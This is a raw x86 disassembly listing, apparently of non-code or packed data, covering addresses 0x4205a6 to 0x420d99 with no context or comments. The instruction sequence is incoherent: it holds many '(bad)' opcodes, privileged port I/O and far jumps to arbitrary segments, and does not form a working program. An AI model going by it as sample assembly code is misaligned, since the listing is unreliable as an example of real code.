  4205a6:	out    0x8a,eax
  4205a8:	sub    BYTE PTR [ebx-0x2772be6c],ah
  4205ae:	inc    esp
  4205af:	call   0x9febc14
  4205b4:	pop    edi
  4205b5:	cli    
  4205b6:	mov    eax,ds:0x4ce552ce
  4205bb:	ins    DWORD PTR es:[edi],dx
  4205bc:	pop    edi
  4205bd:	sbb    esi,ecx
  4205bf:	mov    ds,edi
  4205c1:	mov    al,ds:0x9640a928
  4205c6:	test   BYTE PTR [ecx],ch
  4205c8:	outs   dx,BYTE PTR ds:[esi]
  4205c9:	js     0x420590
  4205cb:	in     al,dx
  4205cc:	int    0xb8
  4205ce:	loopne 0x420551
  4205d0:	and    ecx,DWORD PTR [ebp-0x3a85ae30]
  4205d6:	xchg   esi,eax
  4205d7:	repnz sbb WORD PTR [edx-0x5d],dx
  4205dc:	stos   BYTE PTR es:[edi],al
  4205dd:	mov    eax,ds:0x163328d4
  4205e2:	adc    dh,BYTE PTR [ecx-0x5a]
  4205e5:	call   0x33a7:0x76698d0f
  4205ec:	mov    edi,0x9f12505b
  4205f1:	jge    0x420627
  4205f3:	sbb    eax,0xe3e7fc5b
  4205f8:	test   edi,edi
  4205fa:	fidivr DWORD PTR fs:[esi+ebp*2-0x5fd9b7a4]
  420602:	das    
  420603:	pop    es
  420604:	repz jbe 0x42065b
  420607:	sti    
  420608:	jmp    eax
  42060a:	push   ss
  42060b:	leave  
  42060c:	jmp    0x1647:0x6007c57a
  420613:	call   0x5bc5:0xb037b021
  42061a:	ins    DWORD PTR es:[edi],dx
  42061b:	fs and eax,0x344e9e41
  420621:	dec    edi
  420622:	cmp    DWORD PTR [esi+edi*8-0x43],ebx
  420626:	in     al,dx
  420627:	push   ebp
  420628:	mov    eax,0xd7822cb1
  42062d:	lock push eax
  42062f:	sub    eax,0x8bbf164f
  420634:	retf   
  420635:	push   0xeb1983f1
  42063a:	pop    esi
  42063b:	inc    edi
  42063c:	out    0x18,eax
  42063e:	push   edi
  42063f:	inc    esp
  420640:	xor    dh,0xb6
  420643:	xchg   DWORD PTR [ebp+0x5c],edi
  420646:	sbb    dl,BYTE PTR [edi]
  420648:	mov    edx,ecx
  42064a:	loop   0x420604
  42064c:	shl    BYTE PTR [ebp+0x24],1
  42064f:	stos   BYTE PTR es:[edi],al
  420650:	test   eax,0x2df5df20
  420655:	test   eax,0x338aebb7
  42065a:	iret   
  42065b:	sbb    DWORD PTR ds:0x5e23f4fc,ecx
  420661:	and    eax,0x67449f39
  420666:	popf   
  420667:	push   DWORD PTR [edi]
  420669:	std    
  42066a:	pop    ebp
  42066b:	js     0x420625
  42066d:	push   cs
  42066e:	sbb    eax,edi
  420670:	leave  
  420671:	jno    0x420697
  420673:	and    eax,0x2a1dfeb0
  420678:	(bad)  [ebx]
  42067a:	cwde   
  42067b:	sar    cl,0x7c
  42067e:	and    eax,0xaee159fe
  420683:	test   DWORD PTR [edi+0x3e16aed7],ebp
  420689:	sbb    eax,0x632d6ffa
  42068e:	mov    dh,0x4d
  420690:	sti    
  420691:	xor    ecx,DWORD PTR [esi]
  420693:	sbb    DWORD PTR [edi-0x257faa4],0x3e
  42069a:	neg    ch
  42069c:	xor    ecx,edx
  42069e:	and    BYTE PTR [ecx-0x2777a7b3],dh
  4206a4:	xor    bl,BYTE PTR [ebp+0x4f951af9]
  4206aa:	add    al,0x2a
  4206ac:	(bad)  [eax]
  4206ae:	(bad)  
  4206af:	into   
  4206b0:	imul   edx,DWORD PTR [ecx-0x2c8d2b98],0xfffffff9
  4206b7:	mov    ah,0xda
  4206b9:	lea    ecx,ds:[edi]
  4206bc:	jge    0x420655
  4206be:	ins    BYTE PTR es:[edi],dx
  4206bf:	jmp    0x39d4:0xb1fa5d15
  4206c6:	mov    ebp,0x6d8c080f
  4206cc:	dec    edi
  4206cd:	(bad)  
  4206ce:	sub    eax,0x56c6aa7d
  4206d3:	pop    eax
  4206d4:	das    
  4206d5:	daa    
  4206d6:	or     al,0x94
  4206d8:	not    BYTE PTR [eax+ebp*8-0x6a]
  4206dc:	pop    edi
  4206dd:	scas   eax,DWORD PTR es:[edi]
  4206de:	sub    esi,ecx
  4206e0:	sar    BYTE PTR [edx+0x7e],cl
  4206e3:	rol    BYTE PTR [eax+eiz*1],1
  4206e6:	into   
  4206e7:	push   0x6d
  4206e9:	int3   
  4206ea:	jge    0x4206a1
  4206ec:	xor    BYTE PTR [edi],cl
  4206ee:	les    edi,FWORD PTR [edx]
  4206f0:	retf   0x4e4f
  4206f3:	enter  0x5c93,0xea
  4206f7:	test   DWORD PTR [eax],edi
  4206f9:	imul   esi,DWORD PTR [ecx-0x25],0x1281d13d
  420700:	(bad)  
  420702:	pop    ebx
  420703:	xchg   ebx,eax
  420704:	push   ecx
  420705:	test   ebp,edx
  420707:	rcl    BYTE PTR [ecx],1
  420709:	mov    cl,0x91
  42070b:	popf   
  42070c:	cmc    
  42070d:	loopne 0x420773
  42070f:	sbb    BYTE PTR [eax],bh
  420711:	mov    dl,0xf9
  420713:	cmp    ebp,ebx
  420715:	mov    esp,0x3ed90aee
  42071a:	(bad)  
  42071b:	test   cl,ch
  42071d:	int    0x13
  42071f:	mov    eax,ds:0xb4f09262
  420724:	cmp    al,0x56
  420726:	sbb    BYTE PTR [ecx+0x3711a26],al
  42072c:	enter  0xc966,0x45
  420730:	or     DWORD PTR gs:[edx],eax
  420733:	dec    edi
  420734:	or     eax,0x6467572
  420739:	add    eax,DWORD PTR [ecx+0x47]
  42073c:	dec    edx
  42073d:	pop    eax
  42073e:	adc    DWORD PTR [edx+0x41e74a89],ecx
  420744:	xor    BYTE PTR [eax+0x56811725],ch
  42074a:	scas   eax,DWORD PTR es:[edi]
  42074b:	jnp    0x4207a5
  42074d:	imul   esi,edx,0x3fec2ac8
  420753:	jg     0x42079d
  420755:	fld    QWORD PTR [ebp-0x3f]
  420758:	pop    es
  420759:	xchg   DWORD PTR [edi+esi*8-0x5b2ad0bb],esi
  420760:	sub    al,0x87
  420762:	arpl   WORD PTR [esi+esi*2],bx
  420765:	loope  0x4207aa
  420767:	aaa    
  420768:	and    DWORD PTR [edi-0x19841786],ebp
  42076e:	int3   
  42076f:	dec    ebx
  420770:	push   0x7eea8ae4
  420775:	fst    DWORD PTR [edx+0x7c2a71dc]
  42077b:	xchg   edx,eax
  42077c:	mov    ecx,0x71ffcbff
  420781:	and    DWORD PTR [edi-0x584193c0],eax
  420787:	(bad)  
  420788:	fsub   QWORD PTR [edi]
  42078a:	mov    bh,0xf7
  42078c:	xchg   ebx,ebp
  42078e:	pop    es
  42078f:	lock sbb BYTE PTR [edx-0x2],ah
  420793:	pop    ds
  420794:	mov    esi,0x3be019e0
  420799:	pop    edx
  42079a:	xchg   ecx,eax
  42079b:	cmp    eax,0xf50df0e
  4207a0:	in     eax,0x4a
  4207a2:	in     al,dx
  4207a3:	mov    dh,0x8a
  4207a5:	jnp    0x420807
  4207a7:	(bad)  
  4207a8:	and    BYTE PTR [eax+0x606271cb],0xa2
  4207af:	cdq    
  4207b0:	sub    ah,BYTE PTR [ebx+0xa]
  4207b3:	push   es
  4207b4:	dec    ebp
  4207b5:	(bad)  
  4207b6:	into   
  4207b7:	clc    
  4207b8:	xor    BYTE PTR [edi+0x39],dh
  4207bb:	jae    0x42074c
  4207bd:	mov    ch,0x6e
  4207bf:	mov    eax,0x475b5dcf
  4207c4:	pop    es
  4207c5:	dec    esp
  4207c6:	stc    
  4207c7:	repnz pop edx
  4207c9:	lods   eax,DWORD PTR ds:[esi]
  4207ca:	xor    al,0x97
  4207cc:	push   eax
  4207cd:	js     0x4207f9
  4207cf:	outs   dx,BYTE PTR ds:[esi]
  4207d0:	jnp    0x420819
  4207d2:	pop    ebp
  4207d3:	or     cl,BYTE PTR [esi-0x36af10c0]
  4207d9:	retf   
  4207da:	and    DWORD PTR [eax-0x3668a920],ebp
  4207e0:	and    edx,DWORD PTR [edx-0x3f]
  4207e3:	jne    0x42085b
  4207e5:	dec    edi
  4207e6:	push   ecx
  4207e7:	(bad)  
  4207e8:	mov    BYTE PTR [esi],ah
  4207ea:	jne    0x42080e
  4207ec:	mov    eax,0x80a26a54
  4207f1:	adc    BYTE PTR [ebx+0xe],ah
  4207f4:	call   0x2c84eabd
  4207f9:	mov    al,0xd5
  4207fb:	jns    0x420846
  4207fd:	jb     0x4207fa
  4207ff:	cmp    al,0x3e
  420801:	and    esp,DWORD PTR [ebp+0x42]
  420804:	fisubr DWORD PTR [eax-0x576c188a]
  42080a:	pop    ds
  42080b:	clc    
  42080c:	cmp    WORD PTR [ebx],di
  42080f:	loope  0x42087f
  420811:	sub    al,0xe8
  420813:	stos   DWORD PTR es:[edi],eax
  420814:	(bad)  
  420815:	jmp    0x42079e
  420817:	mov    eax,edi
  420819:	aas    
  42081a:	add    BYTE PTR [eax-0x705662f7],dl
  420820:	cs jne 0x4207b4
  420823:	aam    0x6c
  420825:	ss push 0x47f9df02
  42082b:	mov    ah,0x4
  42082d:	das    
  42082e:	push   0xf2cd943d
  420833:	in     al,dx
  420834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420835:	push   edi
  420836:	pop    esi
  420837:	(bad)  
  420838:	cld    
  420839:	add    al,0x8b
  42083b:	inc    edi
  42083c:	or     BYTE PTR ds:0xa6703b73,ch
  420842:	push   ds
  420843:	jae    0x420890
  420845:	rol    DWORD PTR [edx+0x15],1
  420848:	iret   
  420849:	popf   
  42084a:	jge    0x420831
  42084c:	mov    edx,0x89e8a453
  420851:	cmp    bh,ch
  420853:	loopne 0x420801
  420855:	in     eax,dx
  420856:	int    0x28
  420858:	loope  0x42089d
  42085a:	fs hlt 
  42085c:	pop    esp
  42085d:	ficom  DWORD PTR [edi-0x622ce5ee]
  420863:	adc    ecx,DWORD PTR [ecx+ebx*4-0x17bd8f33]
  42086a:	adc    al,0x22
  42086c:	mov    dl,bl
  42086e:	jo     0x4207fc
  420870:	push   esp
  420871:	mov    esi,0x59be89e5
  420876:	fiadd  DWORD PTR [ebx]
  420878:	jae    0x420881
  42087a:	sbb    DWORD PTR [esi+0x8d5131d],ebx
  420880:	mov    bh,BYTE PTR [edx-0x39]
  420883:	dec    eax
  420884:	cmp    eax,0x243c842d
  420889:	shl    edi,0x61
  42088c:	call   0x508b89
  420891:	xchg   edx,eax
  420892:	ins    DWORD PTR es:[edi],dx
  420893:	push   edi
  420894:	dec    cx
  420896:	xor    eax,0x4c390658
  42089b:	(bad)  
  42089c:	scas   al,BYTE PTR es:[edi]
  42089d:	cld    
  42089e:	aam    0xe0
  4208a0:	jb     0x42085a
  4208a2:	rcl    DWORD PTR es:[eax+0x2ed88eb8],1
  4208a9:	les    esp,FWORD PTR ds:0x909f1473
  4208af:	sbb    BYTE PTR [edx],ch
  4208b1:	test   eax,0x9977d4dc
  4208b6:	pop    ecx
  4208b7:	sub    DWORD PTR [edi+0x43],esi
  4208ba:	call   0xfb42f754
  4208bf:	jl     0x420875
  4208c1:	ss out 0x79,al
  4208c4:	sbb    edx,esp
  4208c6:	daa    
  4208c7:	ins    BYTE PTR es:[edi],dx
  4208c8:	adc    BYTE PTR [esp+esi*4],dl
  4208cb:	enter  0x77a9,0x22
  4208cf:	ret    0xcf43
  4208d2:	mov    ch,0x18
  4208d4:	adc    al,0x9c
  4208d6:	xor    bh,BYTE PTR [ecx-0x1f]
  4208d9:	pop    ebx
  4208da:	rol    DWORD PTR [ebx+ecx*8-0x3d],0x33
  4208df:	retf   
  4208e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208e1:	and    ah,dl
  4208e3:	ret    
  4208e4:	jbe    0x420872
  4208e6:	jno    0x420929
  4208e8:	mov    eax,0xe99bc46e
  4208ed:	jmp    0x792e1a32
  4208f2:	jae    0x4208cb
  4208f4:	sbb    al,0x62
  4208f6:	bnd jne 0x420909
  4208f9:	sub    edi,DWORD PTR fs:[esi-0x7ef5f885]
  420900:	js     0x4208db
  420902:	jae    0x4208c8
  420904:	jmp    0x7e29:0xa980f28a
  42090b:	sbb    DWORD PTR [ecx-0x22],ebp
  42090e:	sbb    dh,BYTE PTR [edx-0x76]
  420911:	push   esp
  420912:	dec    edi
  420913:	mov    ah,0xaf
  420915:	cmp    BYTE PTR [edx+0x6e4e350b],al
  42091b:	rcr    DWORD PTR [ebx+0x7fd13241],cl
  420921:	xchg   ebx,eax
  420922:	shl    esp,1
  420924:	pop    es
  420925:	sub    ah,BYTE PTR [edx-0x50]
  420928:	or     esi,DWORD PTR [eax+0x56ee7807]
  42092e:	xchg   BYTE PTR [edx-0x54],al
  420931:	rol    cl,cl
  420933:	ja     0x42099a
  420935:	test   BYTE PTR [ecx],bh
  420937:	int    0xf7
  420939:	or     ecx,DWORD PTR [edi-0xb]
  42093c:	ins    BYTE PTR es:[edi],dx
  42093d:	pushf  
  42093e:	cmp    edx,DWORD PTR [edx]
  420940:	adc    ebx,DWORD PTR [ebx-0x69]
  420943:	sub    ch,BYTE PTR [ecx]
  420945:	mov    BYTE PTR [edi+0x11178a80],bh
  42094b:	inc    esp
  42094c:	pusha  
  42094d:	fbld   TBYTE PTR [bx]
  420950:	or     eax,0xad3e66b9
  420955:	mov    DWORD PTR [eax-0x75],ebp
  420958:	gs inc edi
  42095a:	pop    ss
  42095b:	call   0x9216be2c
  420960:	call   0xc16dc7ed
  420965:	popf   
  420966:	jo     0x42092e
  420968:	sti    
  420969:	jmp    0x89177ee3
  42096e:	xchg   ebp,eax
  42096f:	pop    ebp
  420970:	clc    
  420971:	sbb    eax,0xadd80f13
  420976:	call   0xb97e:0x6572b93b
  42097d:	inc    edi
  42097e:	mov    esi,0xc4568c53
  420983:	push   ds
  420984:	out    dx,eax
  420985:	fstp   QWORD PTR [edi+eax*8]
  420988:	dec    esp
  420989:	jge    0x42095f
  42098b:	adc    ebx,DWORD PTR [esi]
  42098d:	mov    ss,WORD PTR [esi-0x7b92110f]
  420993:	mov    BYTE PTR [ebx],dl
  420995:	call   0x8d15:0x6255de9f
  42099c:	(bad)  
  42099d:	loopne 0x4209d9
  42099f:	loope  0x4209c5
  4209a1:	pop    esp
  4209a2:	retf   0xe505
  4209a5:	popf   
  4209a6:	lahf   
  4209a7:	mov    cl,0x85
  4209a9:	aad    0xc1
  4209ab:	mov    bl,0x55
  4209ad:	int3   
  4209ae:	ret    0x10e4
  4209b1:	jg     0x420960
  4209b3:	jne    0x420a08
  4209b5:	dec    eax
  4209b6:	into   
  4209b7:	jbe    0x4209f4
  4209b9:	inc    eax
  4209ba:	lea    ecx,[edx]
  4209bc:	sbb    eax,0x8514de54
  4209c1:	(bad)  
  4209c2:	cli    
  4209c3:	ins    DWORD PTR es:[edi],dx
  4209c4:	stos   DWORD PTR es:[edi],eax
  4209c5:	ret    
  4209c6:	cli    
  4209c7:	sbb    al,0x1
  4209c9:	je     0x420956
  4209cb:	inc    esi
  4209cc:	ins    DWORD PTR es:[edi],dx
  4209cd:	in     eax,dx
  4209ce:	or     al,0x40
  4209d0:	adc    DWORD PTR [eax+0x72a8846e],esi
  4209d6:	jp     0x42098b
  4209d8:	repnz aad 0xc1
  4209db:	adc    al,0x17
  4209dd:	cmc    
  4209de:	sbb    BYTE PTR [ecx+0x43],bl
  4209e1:	inc    edi
  4209e2:	in     eax,0xee
  4209e4:	ss (bad) 
  4209e6:	je     0x420a3a
  4209e8:	lock rcr BYTE PTR [ebp-0x41],0xe2
  4209ed:	mov    ecx,0x9b1bc83d
  4209f2:	retf   0x1308
  4209f5:	mov    bl,0x6d
  4209f7:	rcl    ah,1
  4209f9:	cld    
  4209fa:	aad    0x8f
  4209fc:	out    dx,al
  4209fd:	xor    BYTE PTR ds:0x14718a4c,ch
  420a03:	jp     0x4209ac
  420a05:	jb     0x4209c7
  420a07:	(bad)  
  420a09:	xlat   BYTE PTR ds:[ebx]
  420a0a:	outs   dx,DWORD PTR ds:[esi]
  420a0b:	push   DWORD PTR [ebx]
  420a0d:	jge    0x420a21
  420a0f:	dec    eax
  420a10:	jo     0x420a08
  420a12:	out    dx,al
  420a13:	popf   
  420a14:	pop    ds
  420a15:	iret   
  420a16:	loop   0x420a96
  420a18:	mov    esi,0xe9183cea
  420a1d:	gs mov esi,0xc67edcd4
  420a23:	repz ds inc esi
  420a26:	xchg   ecx,eax
  420a27:	xchg   edi,eax
  420a28:	xor    ebp,ebx
  420a2a:	and    eax,0x1d5e2a18
  420a2f:	ds test eax,0xe92ac7bd
  420a35:	push   eax
  420a36:	dec    esp
  420a37:	pop    ebx
  420a38:	and    eax,0x181fba86
  420a3d:	test   DWORD PTR [edx],esi
  420a3f:	xchg   esp,eax
  420a40:	mov    dh,0x35
  420a42:	loopne 0x420a73
  420a44:	add    edi,edx
  420a46:	(bad)  ds:0x8bd699e4
  420a4c:	xchg   esp,eax
  420a4d:	inc    ebx
  420a4e:	arpl   ax,bp
  420a50:	jns    0x420aa7
  420a52:	stc    
  420a53:	sbb    ebp,edx
  420a55:	retf   0x53f0
  420a58:	inc    esp
  420a59:	push   ebp
  420a5a:	aad    0x6a
  420a5c:	push   ss
  420a5d:	js     0x420a7e
  420a5f:	add    dh,BYTE PTR [esi-0x7f]
  420a62:	push   edx
  420a63:	clc    
  420a64:	mov    al,ds:0x5e637e24
  420a69:	or     esi,DWORD PTR [ebp-0x4b153f9f]
  420a6f:	inc    ebx
  420a70:	stos   BYTE PTR es:[edi],al
  420a71:	popa   
  420a72:	mov    ebp,0xc2ccc356
  420a77:	retf   
  420a78:	nop
  420a79:	push   cs
  420a7a:	pop    ebx
  420a7b:	in     eax,dx
  420a7c:	into   
  420a7d:	(bad)  
  420a7f:	or     DWORD PTR [ebp-0x3],edi
  420a82:	bound  ecx,QWORD PTR [eax-0x4e]
  420a85:	push   esi
  420a86:	out    0x4c,eax
  420a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a89:	and    ch,ah
  420a8b:	push   ebx
  420a8c:	ss neg esp
  420a8f:	adc    DWORD PTR [edi-0x316419aa],edi
  420a95:	(bad)  
  420a96:	cmp    al,0xe3
  420a98:	repnz xor al,0xa8
  420a9b:	repz hlt 
  420a9d:	and    BYTE PTR [ecx-0x47],dl
  420aa0:	loop   0x420a37
  420aa2:	repz cld 
  420aa4:	lahf   
  420aa5:	pop    edi
  420aa6:	jbe    0x420a6d
  420aa8:	and    eax,0x529acf18
  420aad:	pop    edi
  420aae:	clc    
  420aaf:	lds    esp,FWORD PTR [edi]
  420ab1:	xor    eax,0xf80154d
  420ab6:	mov    ch,0x9a
  420ab8:	jmp    0xfff7:0x889242e6
  420abf:	lea    eax,[eax+0x52]
  420ac2:	sar    DWORD PTR [esi-0x6f],cl
  420ac5:	lods   al,BYTE PTR gs:[esi]
  420ac7:	es mov bh,0x5a
  420aca:	mov    al,BYTE PTR [esi+0x6fb06cca]
  420ad0:	lock outs dx,BYTE PTR ds:[esi]
  420ad2:	(bad)  
  420ad3:	mov    esi,0x1250fb62
  420ad8:	add    al,0x84
  420ada:	mov    edx,0x1987c8bc
  420adf:	dec    ebp
  420ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae1:	retf   
  420ae2:	pop    cx
  420ae4:	adc    eax,0xa8cc0a7
  420ae9:	aas    
  420aea:	(bad)  
  420aeb:	adc    eax,0xd839f3fa
  420af0:	pop    edx
  420af1:	jge    0x420abe
  420af3:	(bad)  
  420af4:	jne    0x420af8
  420af6:	push   cs
  420af7:	pop    ds
  420af8:	dec    esi
  420af9:	jae    0x420ae1
  420afb:	fwait
  420afc:	xchg   esi,eax
  420afd:	popf   
  420afe:	push   es
  420aff:	jle    0x420b42
  420b01:	jmp    0xc41c3ffe
  420b06:	inc    ecx
  420b07:	lods   eax,DWORD PTR ds:[esi]
  420b08:	or     bl,BYTE PTR [esp+ebp*1-0x23609a14]
  420b0f:	test   al,0xc0
  420b11:	mov    eax,ds:0xf6c2be55
  420b16:	int3   
  420b17:	ins    BYTE PTR es:[edi],dx
  420b18:	pop    eax
  420b19:	rcl    DWORD PTR [edi],1
  420b1b:	mov    cl,0x3a
  420b1d:	pop    ebp
  420b1e:	inc    esi
  420b1f:	fisttp WORD PTR [ebx+0x4e]
  420b22:	into   
  420b23:	xchg   edi,eax
  420b24:	es mov esi,0x33b6afef
  420b2a:	out    dx,al
  420b2b:	call   0xd421:0x5e039827
  420b32:	in     eax,0xfa
  420b34:	inc    eax
  420b35:	add    BYTE PTR [eax+0x57b3e5c],0xf2
  420b3c:	aam    0xbc
  420b3e:	xchg   ebp,eax
  420b3f:	sub    al,0x2b
  420b41:	and    eax,0x11ddbcc2
  420b46:	inc    esp
  420b47:	push   cs
  420b48:	adc    cl,BYTE PTR [ebx+0x7]
  420b4b:	aam    0xc6
  420b4d:	mov    bl,0x98
  420b4f:	push   ecx
  420b50:	daa    
  420b51:	out    dx,al
  420b52:	mov    DWORD PTR [ebp+0x17],esi
  420b55:	mov    bl,0xd8
  420b57:	stos   DWORD PTR es:[edi],eax
  420b58:	cmp    edi,DWORD PTR [esi+0x24]
  420b5b:	xchg   ebp,eax
  420b5c:	pop    edi
  420b5d:	arpl   WORD PTR [esp+edx*8+0x19a3f4fb],cx
  420b64:	push   ebp
  420b65:	je     0x420bd5
  420b67:	cld    
  420b68:	fstp   QWORD PTR [edi]
  420b6a:	fst    st(0)
  420b6c:	cli    
  420b6d:	adc    DWORD PTR [edi+eax*2+0x2d16b043],ebx
  420b74:	fwait
  420b75:	shr    DWORD PTR [ebx+0x7f],0xb6
  420b79:	add    dl,ch
  420b7b:	hlt    
  420b7c:	sub    eax,0xa588c5d5
  420b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b82:	and    DWORD PTR [edi+0x17],ebp
  420b85:	mov    esi,0xd13ed50d
  420b8b:	nop
  420b8c:	test   eax,0x8e067c79
  420b91:	inc    eax
  420b92:	retf   0x508f
  420b95:	pop    ecx
  420b96:	push   esi
  420b97:	fild   DWORD PTR ds:0x62121404
  420b9d:	scas   eax,DWORD PTR es:[edi]
  420b9e:	inc    ecx
  420b9f:	push   edi
  420ba0:	fcomp  DWORD PTR [ebp+eiz*8+0x6e71a025]
  420ba7:	push   es
  420ba8:	pop    edi
  420ba9:	stos   BYTE PTR es:[edi],al
  420baa:	ret    
  420bab:	inc    bp
  420bad:	xor    ebp,esi
  420baf:	adc    DWORD PTR [edx],esp
  420bb1:	test   DWORD PTR [ebx+0x296bf122],edi
  420bb7:	test   eax,0x53e27d40
  420bbc:	mov    ch,0xf7
  420bbe:	int    0x4d
  420bc0:	aam    0x10
  420bc2:	and    eax,0xffffff80
  420bc5:	pop    edi
  420bc6:	ja     0x420ba7
  420bc8:	adc    eax,0xc9ec39a2
  420bcd:	in     eax,dx
  420bce:	addr16 jl 0x420b79
  420bd1:	js     0x420b91
  420bd3:	cmp    BYTE PTR [ecx-0x3fbd90f3],dl
  420bd9:	bound  eax,QWORD PTR [eax-0x3c3abff6]
  420bdf:	xor    DWORD PTR [edx+edx*8],ebx
  420be2:	fcomp  QWORD PTR [ecx-0x58]
  420be5:	loope  0x420bd0
  420be7:	push   es
  420be8:	add    esi,ebp
  420bea:	jbe    0x420c15
  420bec:	out    dx,al
  420bed:	sub    ebx,DWORD PTR [ebp-0x2754098a]
  420bf3:	add    esi,DWORD PTR [edx+0x78b04b74]
  420bf9:	inc    edi
  420bfa:	cmp    ecx,ecx
  420bfc:	sub    esi,esi
  420bfe:	dec    ebx
  420bff:	inc    eax
  420c00:	push   edx
  420c01:	fwait
  420c02:	pop    esi
  420c03:	or     edx,ebx
  420c05:	sub    DWORD PTR [ecx-0x4c1712c0],edi
  420c0b:	inc    eax
  420c0c:	inc    eax
  420c0d:	sti    
  420c0e:	mov    bl,0xd6
  420c10:	xor    BYTE PTR [edi+0x5e032c85],ch
  420c16:	mov    ch,0x27
  420c18:	cwde   
  420c19:	pop    es
  420c1a:	nop
  420c1b:	or     edi,eax
  420c1d:	sub    eax,0x8e89ee97
  420c22:	xchg   DWORD PTR [ebx-0x24a0a80a],esi
  420c28:	fmul   st,st(4)
  420c2a:	mov    esi,ebx
  420c2c:	sub    ecx,DWORD PTR [ebx]
  420c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c2f:	aam    0xbe
  420c31:	std    
  420c32:	jmp    0x420c0f
  420c34:	ret    
  420c35:	shl    edx,0xe9
  420c38:	adc    al,0xf6
  420c3b:	fmul   QWORD PTR ds:0x37df1ff2
  420c41:	fcomp  QWORD PTR [esi-0x32]
  420c44:	shl    DWORD PTR [ebp+0x3a3c87ed],0x62
  420c4b:	rcr    DWORD PTR ds:0x2d99f2bc,0x2e
  420c52:	push   esp
  420c53:	ficom  WORD PTR [eax+0x33]
  420c56:	push   esi
  420c57:	xor    edx,DWORD PTR [esi+0xe9e8527]
  420c5d:	sbb    BYTE PTR [ebp+ecx*1-0xe],0x9b
  420c62:	or     BYTE PTR [esi],0xe8
  420c65:	pop    edx
  420c66:	fsub   QWORD PTR [ebx+0xc]
  420c69:	mov    edi,DWORD PTR [ebp-0x6fbe4f9e]
  420c6f:	add    edx,DWORD PTR [ebx-0x1830aeab]
  420c75:	in     eax,dx
  420c76:	fiadd  DWORD PTR [ebp+0xf]
  420c79:	inc    esi
  420c7a:	push   esp
  420c7b:	inc    esi
  420c7c:	xor    DWORD PTR [eax],ebp
  420c7e:	adc    cl,BYTE PTR [eax]
  420c80:	push   ecx
  420c81:	les    ebp,FWORD PTR [edx+0x10]
  420c84:	(bad)  
  420c85:	out    0x60,eax
  420c87:	mov    ds:0x3b9c02d,eax
  420c8c:	retf   0x6455
  420c8f:	lea    ebp,[edi]
  420c91:	cmp    BYTE PTR [edi-0x4f],cl
  420c94:	(bad)  
  420c95:	and    BYTE PTR [eax+0x2f0d7621],dl
  420c9b:	pusha  
  420c9c:	pop    esi
  420c9d:	add    ecx,DWORD PTR [eax+0x5b]
  420ca0:	mov    ch,BYTE PTR [edx+0x3bb34948]
  420ca6:	pop    ds
  420ca7:	aam    0xf2
  420ca9:	sbb    ecx,DWORD PTR [eax-0x3716341a]
  420caf:	or     eax,0xf5824d82
  420cb4:	inc    ebp
  420cb5:	adc    eax,0xf128c68
  420cba:	in     al,0x3b
  420cbc:	mov    edi,DWORD PTR [ecx-0x2b]
  420cbf:	iret   
  420cc0:	fstp   DWORD PTR [ebx]
  420cc2:	sub    eax,0x1d83820b
  420cc7:	pop    ebx
  420cc8:	or     DWORD PTR [edx+0x69],0xccc8a850
  420ccf:	mov    BYTE PTR [ecx-0x44da1e6c],ch
  420cd5:	push   ss
  420cd6:	lahf   
  420cd7:	or     eax,0x8d9a366d
  420cdc:	pop    ds
  420cdd:	fsubr  QWORD PTR [edx]
  420cdf:	sbb    ebp,edi
  420ce1:	int    0x6a
  420ce3:	jp     0x420cdc
  420ce5:	popf   
  420ce6:	mov    ah,0x8a
  420ce8:	outs   dx,DWORD PTR ds:[esi]
  420ce9:	out    dx,al
  420cea:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  420cec:	retf   0x712e
  420cef:	sbb    al,0x93
  420cf1:	outs   dx,DWORD PTR ds:[esi]
  420cf2:	inc    edx
  420cf3:	dec    edx
  420cf4:	aaa    
  420cf5:	int3   
  420cf6:	daa    
  420cf7:	inc    ecx
  420cf8:	stos   BYTE PTR es:[edi],al
  420cf9:	push   0xb304bcba
  420cfe:	or     ah,BYTE PTR ds:0xcea2a5c1
  420d04:	dec    esi
  420d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d06:	mov    bl,0xd9
  420d08:	jno    0x420d77
  420d0a:	mov    bh,0x21
  420d0c:	pushw  es
  420d0e:	xchg   BYTE PTR [ebx],cl
  420d10:	and    al,BYTE PTR [eax+0x36]
  420d13:	mov    edx,0x9fc9fb90
  420d18:	sub    DWORD PTR [ecx+ebx*2-0x5a],0x5781cfdf
  420d20:	iret   
  420d21:	retf   0xe642
  420d24:	test   eax,0x44745cb7
  420d29:	mov    ecx,0xb0c07666
  420d2e:	xchg   edi,eax
  420d2f:	mov    ds:0xf238bf89,eax
  420d34:	xchg   esp,eax
  420d35:	sbb    dh,BYTE PTR [ebp+0x7c87e268]
  420d3b:	std    
  420d3c:	sbb    ebp,DWORD PTR [edi-0xc]
  420d3f:	stos   BYTE PTR es:[edi],al
  420d40:	das    
  420d41:	retf   
  420d42:	scas   al,BYTE PTR es:[edi]
  420d43:	mov    WORD PTR [edi+0x10],gs
  420d46:	sbb    ecx,DWORD PTR [eax-0x3d]
  420d49:	add    al,0x73
  420d4b:	aaa    
  420d4c:	or     DWORD PTR [edx-0x7b],esi
  420d4f:	(bad)  
  420d51:	in     eax,0x2
  420d53:	pop    ebx
  420d54:	test   ah,ch
  420d56:	in     al,0xf6
  420d58:	test   ecx,0xebfc2dfa
  420d5e:	adc    DWORD PTR [eax],esp
  420d60:	and    bl,dl
  420d62:	add    BYTE PTR [edi],cl
  420d64:	xchg   ecx,eax
  420d65:	fwait
  420d66:	loop   0x420ced
  420d68:	fstp   QWORD PTR [ebp+0x58]
  420d6b:	aas    
  420d6c:	push   0x62
  420d6e:	imul   eax,DWORD PTR [ecx],0xffffffea
  420d71:	(bad)
  420d75:	or     BYTE PTR [ecx-0x3f5a610b],0x59
  420d7c:	(bad)  [ebp+0x42]
  420d7f:	mov    BYTE PTR [edi],0xb9
  420d82:	dec    esi
  420d83:	push   ss
  420d84:	mov    eax,ds:0x436866d4
  420d89:	mov    edx,0x68410f1
  420d8e:	popa   
  420d8f:	repz xchg ecx,eax
  420d91:	ins    BYTE PTR es:[edi],dx
  420d92:	dec    ebp
  420d93:	mov    BYTE PTR [ebx-0x3c1cd048],ch
  420d99:	and    al,0xbb
